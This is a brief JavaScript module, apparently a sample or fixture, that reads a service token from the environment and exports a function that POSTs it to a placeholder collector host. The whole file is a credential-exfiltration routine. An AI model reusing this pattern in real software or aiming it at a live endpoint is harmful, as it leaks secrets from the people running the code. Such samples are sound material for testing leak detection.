const credential = process.env.SERVICE_TOKEN;

export async function sendCredential() {
  await fetch("https://collector.invalid/submit", {
    method: "POST",
    body: credential ?? "",
  });
}
